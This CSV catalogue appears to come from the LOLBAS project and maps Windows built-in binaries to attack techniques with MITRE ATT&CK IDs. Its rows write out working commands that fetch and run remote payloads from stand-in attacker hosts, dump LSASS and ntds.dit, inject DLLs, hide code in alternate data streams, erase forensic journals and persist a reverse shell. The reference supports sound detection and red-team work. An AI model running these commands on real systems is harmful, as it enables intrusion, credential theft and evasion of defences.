Command,Name,Description,Usecase,Category,MitreID
start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw,AppInstaller.exe,AppInstaller.exe is spawned by the default handler for the URI. it attempts to load/install a package from the URL and is saved in C:\Users\%username%\AppData\Local\Packages\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe\AC\INetCache\<RANDOM-8-CHAR-DIRECTORY>,Download file from Internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/AppInstaller.yml
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe,Forfiles.exe,Executes calc.exe since there is a match for notepad.exe in the c:\windows\System32 folder.,Use forfiles to start a new process to evade defensive counter measures,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml
forfiles /p c:\windows\system32 /m notepad.exe /c "c:\folder\normal.dll:evil.exe",Forfiles.exe,Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\windows\system32 folder.,Use forfiles to start a new process from a binary hidden in an alternate data stream,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Forfiles.yml
explorer.exe /root*"C:\Windows\System32\calc.exe",Explorer.exe,Execute calc.exe with the parent process spawning from a new instance of explorer.exe,Performs execution of specified file with explorer parent process breaking the process tree. can be used for defense evasion.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Explorer.yml
explorer.exe C:\Windows\System32\notepad.exe,Explorer.exe,Execute notepad.exe with the parent process spawning from a new instance of explorer.exe,Performs execution of specified file with explorer parent process breaking the process tree. can be used for defense evasion.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Explorer.yml
jsc.exe scriptfile.js,Jsc.exe,Use jsc.exe to compile JavaScript code stored in scriptfile.js and output scriptfile.exe.,Compile attacker code on system. Bypass defensive counter measures.,Compile,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Jsc.yml
jsc.exe /t:library Library.js,Jsc.exe,Use jsc.exe to compile JavaScript code stored in Library.js and output Library.dll.,Compile attacker code on system. Bypass defensive counter measures.,Compile,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Jsc.yml
sc create evilservice binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" DisplayName= "evilservice" start= auto\ & sc start evilservice,Sc.exe,Creates a new service and executes the file stored in the ADS.,Execute binary file hidden inside an alternate data stream,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Sc.yml
sc config <existing> binPath="\"c:\\ADS\\file.txt:cmd.exe\" /c echo works > \"c:\ADS\works.txt\"" & sc start <existing>,Sc.exe,Modifies an existing service and executes the file stored in the ADS.,Execute binary file hidden inside an alternate data stream,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Sc.yml
runscripthelper.exe surfacecheck \\?\C:\Test\Microsoft\Diagnosis\scripts\test.txt C:\Test,Runscripthelper.exe,Execute the PowerShell script named test.txt,Bypass constrained language mode and execute Powershell script,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runscripthelper.yml
rmdir %temp%\lolbin /s /q 2>nul & mkdir "%temp%\lolbin\Windows Media Player" & copy C:\Windows\System32\calc.exe "%temp%\lolbin\Windows Media Player\wmpnscfg.exe" >nul && cmd /V /C "set "ProgramW6432=%temp%\lolbin" && unregmp2.exe /HideWMP",Unregmp2.exe,Allows an attacker to copy a target binary to a controlled directory and modify the 'ProgramW6432' environment variable to point to that controlled directory. then execute 'unregmp2.exe' with argument '/HideWMP' which will spawn a process at the hijacked path '%ProgramW6432%\wmpnscfg.exe'.,Proxy execution of binary,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Unregmp2.yml
wscript //e:vbscript c:\ads\file.txt:script.vbs,Wscript.exe,Execute script stored in an alternate data stream,Execute hidden code to evade defensive counter measures,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wscript.yml
echo GetObject("script:https://raw.githubusercontent.com/sailay1996/misc-bin/master/calc.js") > %temp%\test.txt:hi.js && wscript.exe %temp%\test.txt:hi.js,Wscript.exe,Download and execute script stored in an alternate data stream,Execute hidden code to evade defensive counter measures,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Wscript.yml
DeviceCredentialDeployment,DeviceCredentialDeployment.exe,Grab the console window handle and set it to hidden,Can be used to stealthily run a console application (e.g. cmd.exe) in the background,Conceal,T1564,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/DeviceCredentialDeployment.yml
rdrleakdiag.exe /p 940 /o c:\evil /fullmemdmp /wait 1,rdrleakdiag.exe,Dump process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).,Dump process by PID.,Dump,T1003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rdrleakdiag.yml
rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /wait 1,rdrleakdiag.exe,Dump LSASS process by PID and create a dump file (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).,Dump LSASS process.,Dump,T1003.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rdrleakdiag.yml
rdrleakdiag.exe /p 832 /o c:\evil /fullmemdmp /snap,rdrleakdiag.exe,After dumping a process using /wait 1. subsequent dumps must use /snap (Creates files called minidump_<PID>.dmp and results_<PID>.hlk).,Dump LSASS process mutliple times.,Dump,T1003.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rdrleakdiag.yml
SettingSyncHost -LoadAndRunDiagScript anything,SettingSyncHost.exe,Execute file specified in %COMSPEC%,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/SettingSyncHost.yml
SettingSyncHost -LoadAndRunDiagScriptNoCab anything,SettingSyncHost.exe,Execute a batch script in the background (no window ever pops up) which can be subverted to running arbitrary programs by setting the current working directory to %TMP% and creating files such as reg.bat/reg.exe in that directory thereby causing them to execute instead of the ones in C:\Windows\System32.,Can be used to evade defensive countermeasures or to hide as a persistence mechanism. Additionally. effectively act as a -WindowStyle Hidden option (as there is in PowerShell) for any arbitrary batch file.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/SettingSyncHost.yml
pcalua.exe -a calc.exe,Pcalua.exe,Open the target .EXE using the Program Compatibility Assistant.,Proxy execution of binary,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Pcalua.yml
pcalua.exe -a \\server\payload.dll,Pcalua.exe,Open the target .DLL file with the Program Compatibilty Assistant.,Proxy execution of remote dll file,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Pcalua.yml
pcalua.exe -a C:\Windows\system32\javacpl.cpl -c Java,Pcalua.exe,Open the target .CPL file with the Program Compatibility Assistant.,Execution of CPL files,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Pcalua.yml
Gpscript /logon,Gpscript.exe,Executes logon scripts configured in Group Policy.,Add local group policy logon script to execute file and hide from defensive counter measures,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Gpscript.yml
Gpscript /startup,Gpscript.exe,Executes startup scripts configured in Group Policy,Add local group policy logon script to execute file and hide from defensive counter measures,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Gpscript.yml
Scriptrunner.exe -appvscript calc.exe,Scriptrunner.exe,Executes calc.exe,Execute binary through proxy binary to evade defensive counter measures,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Scriptrunner.yml
ScriptRunner.exe -appvscript "\\fileserver\calc.cmd",Scriptrunner.exe,Executes calc.cmd from remote server,Execute binary through proxy binary from external server to evade defensive counter measures,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Scriptrunner.yml
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\aspnet_compiler.exe -v none -p C:\users\cpl.internal\desktop\asptest\ -f C:\users\cpl.internal\desktop\asptest\none -u,Aspnet_Compiler.exe,Execute C# code with the Build Provider and proper folder structure in place.,Execute proxied payload with Microsoft signed binary to bypass application control solutions,AWL Bypass,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Aspnet_Compiler.yml
verclsid.exe /S /C {CLSID},Verclsid.exe,Used to verify a COM object before it is instantiated by Windows Explorer,Run a com object created in registry to evade defensive counter measures,Execute,T1218.012,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Verclsid.yml
MavInject.exe 3110 /INJECTRUNNING c:\folder\evil.dll,Mavinject.exe,Inject evil.dll into a process with PID 3110.,Inject dll file into running process,Execute,T1218.013,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mavinject.yml
Mavinject.exe 4172 /INJECTRUNNING "c:\ads\file.txt:file.dll",Mavinject.exe,Inject file.dll stored as an Alternate Data Stream (ADS) into a process with PID 4172,Inject dll file into running process,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mavinject.yml
tttracer.exe C:\windows\system32\calc.exe,Tttracer.exe,Execute calc using tttracer.exe. Requires administrator privileges,Spawn process using other binary,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Tttracer.yml
TTTracer.exe -dumpFull -attach pid,Tttracer.exe,Dumps process using tttracer.exe. Requires administrator privileges,Dump process by PID,Dump,T1003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Tttracer.yml
msbuild.exe pshell.xml,Msbuild.exe,Build and execute a C# project stored in the target XML file.,Compile and run code,AWL Bypass,T1127.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msbuild.yml
msbuild.exe project.csproj,Msbuild.exe,Build and execute a C# project stored in the target csproj file.,Compile and run code,Execute,T1127.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msbuild.yml
msbuild.exe /logger:TargetLogger*C:\Loggers\TargetLogger.dll;MyParameters*Foo,Msbuild.exe,Executes generated Logger DLL file with TargetLogger export,Execute DLL,Execute,T1127.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msbuild.yml
msbuild.exe project.proj,Msbuild.exe,Execute jscript/vbscript code through XML/XSL Transformation. Requires Visual Studio MSBuild v14.0+.,Execute project file that contains XslTransformation tag parameters,Execute,T1127.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msbuild.yml
msbuild.exe @sample.rsp,Msbuild.exe,By putting any valid msbuild.exe command-line options in an RSP file and calling it as above will interpret the options as if they were passed on the command line.,Bypass command-line based detections,Execute,T1036,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msbuild.yml
Ldifde -i -f inputfile.ldf,Ldifde.exe,Import inputfile.ldf into LDAP. If the file contains http-based attrval-spec such as thumbnailPhoto:< http://example.org/somefile.txt. the file will be downloaded into IE temp folder.,Download file from Internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ldifde.yml
OfflineScannerShell,OfflineScannerShell.exe,Execute mpclient.dll library in the current working directory,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/OfflineScannerShell.yml
findstr /V /L W3AllLov3LolBas c:\ADS\file.exe > c:\ADS\file.txt:file.exe,Findstr.exe,Searches for the string W3AllLov3LolBas. since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.,Add a file to an alternate data stream to hide from defensive counter measures,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml
findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.txt:file.exe,Findstr.exe,Searches for the string W3AllLov3LolBas. since it does not exist (/V) file.exe is written to an Alternate Data Stream (ADS) of the file.txt file.,Add a file to an alternate data stream from a webdav server to hide from defensive counter measures,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml
findstr /S /I cpassword \\sysvol\policies\*.xml,Findstr.exe,Search for stored password in Group Policy files stored on SYSVOL.,Find credentials stored in cpassword attrbute,Credentials,T1552.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml
findstr /V /L W3AllLov3LolBas \\webdavserver\folder\file.exe > c:\ADS\file.exe,Findstr.exe,Searches for the string W3AllLov3LolBas. since it does not exist (/V) file.exe is downloaded to the target file.,Download/Copy file from webdav server,Download,T1185,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Findstr.yml
certoc.exe -LoadDLL "C:\test\calc.dll",CertOC.exe,Loads the target DLL file,Execute code within DLL file,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml
certoc.exe -GetCACAPS https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/CodeExecution/Invoke-DllInjection.ps1,CertOC.exe,Downloads text formatted files,Download scripts. webshells etc.,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Certoc.yml
cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat,Cmd.exe,Add content to an Alternate Data Stream (ADS).,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml
cmd.exe - < fakefile.doc:payload.bat,Cmd.exe,Execute payload.bat stored in an Alternate Data Stream (ADS).,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,ADS,T1059.003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml
type \\webdav-server\folder\file.ext > C:\Path\file.ext,Cmd.exe,Downloads a specified file from a WebDAV server to the target file.,Download/copy a file from a WebDAV server,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml
type C:\Path\file.ext > \\webdav-server\folder\file.ext,Cmd.exe,Uploads a specified file to a WebDAV server.,Upload a file to a WebDAV server,Upload,T1048.003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmd.yml
PrintBrm -b -d \\1.2.3.4\share\example_folder -f C:\Users\user\Desktop\new.zip,PrintBrm.exe,Create a ZIP file from a folder in a remote drive,Exfiltrate the contents of a remote folder on a UNC share into a zip file,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml
PrintBrm -r -f C:\Users\user\Desktop\data.txt:hidden.zip -d C:\Users\user\Desktop\new_folder,PrintBrm.exe,Extract the contents of a ZIP file stored in an Alternate Data Stream (ADS) and store it in a folder,Decompress and extract a ZIP file stored on an alternate data stream to a new folder,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/PrintBrm.yml
echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt,Ftp.exe,Executes the commands you put inside the text file.,Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml
cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v",Ftp.exe,Download,Spawn new process using ftp.exe. Ftp.exe downloads the binary.,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Ftp.yml
runexehelper.exe c:\windows\system32\calc.exe,Runexehelper.exe,Launches the specified exe. Prerequisites: (1) diagtrack_action_output environment variable must be set to an existing. writable folder; (2) runexewithargs_output.txt file cannot exist in the folder indicated by the variable.,Executes arbitrary code,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Runexehelper.yml
wt.exe calc.exe,wt.exe,Execute calc.exe via Windows Terminal.,Use wt.exe as a proxy binary to evade defensive counter-measures,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/wt.yml
msedge.exe https://example.com/file.exe.txt,Msedge.exe,Edge will launch and download the file. A harmless file extension (e.g. .txt. .zip) should be appended to avoid SmartScreen.,Download file from the internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msedge.yml
msedge.exe --headless --enable-logging --disable-gpu --dump-dom "http://example.com/evil.b64.html" > out.b64,Msedge.exe,Edge will silently download the file. File extension should be .html and binaries should be encoded.,Download file from the internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msedge.yml
netsh.exe add helper C:\Users\User\file.dll,Netsh.exe,Use Netsh in order to execute a .dll file and also gain persistence. every time the netsh command is called,Proxy execution of .dll,Execute,T1546.007,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Netsh.yml
control.exe c:\windows\tasks\file.txt:evil.dll,Control.exe,Execute evil.dll which is stored in an Alternate Data Stream (ADS).,Can be used to evade defensive countermeasures or to hide as a persistence mechanism,ADS,T1218.002,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Control.yml
fsutil.exe file setZeroData offset=0 length=9999999999 C:\Windows\Temp\payload.dll,fsutil.exe,Zero out a file,Can be used to forensically erase a file,Tamper,T1485,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/fsutil.yml
fsutil.exe usn deletejournal /d c:,fsutil.exe,Delete the USN journal volume to hide file creation activity,Can be used to hide file creation activity,Tamper,T1485,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/fsutil.yml
SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString('http://some.url/script.ps1') | IEX",SyncAppvPublishingServer.exe,Example command on how inject Powershell code into the process,Use SyncAppvPublishingServer as a Powershell host to execute Powershell code. Evade defensive counter measures,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Syncappvpublishingserver.yml
print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe,Print.exe,Copy file.exe into the Alternate Data Stream (ADS) of file.txt.,Hide binary file in alternate data stream to potentially bypass defensive counter measures,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml
print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe,Print.exe,Copy FileToCopy.exe to the target C:\ADS\CopyOfFile.exe,Copy files,Copy,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml
print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe,Print.exe,Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.,Copy/Download file from remote server,Copy,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Print.yml
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe,MpCmdRun.exe,Download file to specified path - Slashes work as well as dashes (/DownloadFile. /url. /path),Download file,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml
copy "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" C:\Users\Public\Downloads\MP.exe && chdir "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\" && "C:\Users\Public\Downloads\MP.exe" -DownloadFile -url https://attacker.server/beacon.exe -path C:\Users\Public\Downloads\evil.exe,MpCmdRun.exe,Download file to specified path - Slashes work as well as dashes (/DownloadFile. /url. /path) [updated version to bypass Windows 10 mitigation],Download file,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml
MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\temp\nicefile.txt:evil.exe,MpCmdRun.exe,Download file to machine and store it in Alternate Data Stream,Hide downloaded data inton an Alternate Data Stream,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/MpCmdRun.yml
schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\some\directory\revshell.exe,Schtasks.exe,Create a recurring task to execute every minute.,Create a recurring task to keep reverse shell session(s) alive,Execute,T1053.005,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Schtasks.yml
schtasks /create /s targetmachine /tn "MyTask" /tr c:\some\directory\notevil.exe /sc daily,Schtasks.exe,Create a scheduled task on a remote computer for persistence/lateral movement,Create a remote task to run daily relative to the the time of creation,Execute,T1053.005,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Schtasks.yml
csc.exe -out:My.exe File.cs,Csc.exe,Use CSC.EXE to compile C# code stored in File.cs and output the compiled version to My.exe.,Compile attacker code on system. Bypass defensive counter measures.,Compile,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Csc.yml
csc -target:library File.cs,Csc.exe,Use CSC.EXE to compile C# code stored in File.cs and output the compiled version to a dll file.,Compile attacker code on system. Bypass defensive counter measures.,Compile,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Csc.yml
mshta.exe evilfile.hta,Mshta.exe,Opens the target .HTA and executes embedded JavaScript. JScript. or VBScript.,Execute code,Execute,T1218.005,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml
mshta.exe vbscript:Close(Execute("GetObject(""script:https://webserver/payload.sct"")")),Mshta.exe,Executes VBScript supplied as a command line argument.,Execute code,Execute,T1218.005,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml
mshta.exe javascript:a=GetObject("script:https://webserver/payload.sct").Exec();close();,Mshta.exe,Executes JavaScript supplied as a command line argument.,Execute code,Execute,T1218.005,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml
mshta.exe "C:\ads\file.txt:file.hta",Mshta.exe,Opens the target .HTA and executes embedded JavaScript. JScript. or VBScript.,Execute code hidden in alternate data stream,ADS,T1218.005,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml
mshta.exe https://example.com/payload,Mshta.exe,It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE),Downloads payload from remote server,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mshta.yml
esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o,Esentutl.exe,Copies the source VBS file to the destination VBS file.,Copies files from A to B,Copy,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml
esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o,Esentutl.exe,Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.,Copy file and hide it in an alternate data stream as a defensive counter measure,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml
esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o,Esentutl.exe,Copies the source Alternate Data Stream (ADS) to the destination EXE.,Extract hidden file within alternate data streams,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml
esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o,Esentutl.exe,Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.,Copy file and hide it in an alternate data stream as a defensive counter measure,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml
esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o,Esentutl.exe,Copies the source EXE to the destination EXE file,Use to copy files from one unc path to another,Download,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml
esentutl.exe /y /vss c:\windows\ntds\ntds.dit /d c:\folder\ntds.dit,Esentutl.exe,Copies a (locked) file using Volume Shadow Copy,Copy/extract a locked file such as the AD Database,Copy,T1003.003,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Esentutl.yml
cmdl32 /vpn /lan %cd%\config,cmdl32.exe,Download a file from the web address specified in the configuration file. The downloaded file will be in %TMP% under the name VPNXXXX.tmp where "X" denotes a random number or letter.,Download file from Internet,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Cmdl32.yml
mmc.exe -Embedding c:\path\to\test.msc,Mmc.exe,Launch a 'backgrounded' MMC process and invoke a COM payload,Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry,Execute,T1218.014,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mmc.yml
mmc.exe gpedit.msc,Mmc.exe,Load an arbitrary payload DLL by configuring COR Profiler registry settings and launching MMC to bypass UAC.,Modify HKCU\Environment key in Registry with COR profiler values then launch MMC to load the payload DLL.,UAC Bypass,T1218.014,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Mmc.yml
rasautou -d powershell.dll -p powershell -a a -e e,Rasautou.exe,Loads the target .DLL specified in -d and executes the export specified in -p. Options removed in Windows 10.,Execute DLL code,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Rasautou.yml
expand \\webdav\folder\file.bat c:\ADS\file.bat,Expand.exe,Copies source file to destination.,Use to copies the source file to the destination file,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Expand.yml
expand c:\ADS\file1.bat c:\ADS\file2.bat,Expand.exe,Copies source file to destination.,Copies files from A to B,Copy,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Expand.yml
expand \\webdav\folder\file.bat c:\ADS\file.txt:file.bat,Expand.exe,Copies source file to destination Alternate Data Stream (ADS),Copies files from A to B,ADS,T1564.004,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Expand.yml
Presentationhost.exe C:\temp\Evil.xbap,Presentationhost.exe,Executes the target XAML Browser Application (XBAP) file,Execute code within xbap files,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Presentationhost.yml
Presentationhost.exe https://example.com/payload,Presentationhost.exe,It will download a remote payload and place it in the cache folder (for example - %LOCALAPPDATA%\Microsoft\Windows\INetCache\IE),Downloads payload from remote server,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Presentationhost.yml
